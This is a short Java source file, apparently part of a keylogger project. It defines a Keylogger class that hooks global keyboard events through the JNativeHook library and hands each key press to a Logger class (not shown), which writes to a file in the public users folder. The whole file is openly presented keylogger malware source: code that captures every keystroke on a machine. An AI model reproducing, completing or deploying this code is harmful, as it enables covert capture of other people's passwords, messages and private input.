package keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener{
	private Logger logger;
	private static final String path = "C:\\users\\public\\log.txt"; 
	
	public Keylogger() {
		logger = new Logger(path);
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		if(logger.log(arg0))
			System.out.println("Success");
		else
			System.out.println("Fail");
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {

	}
}
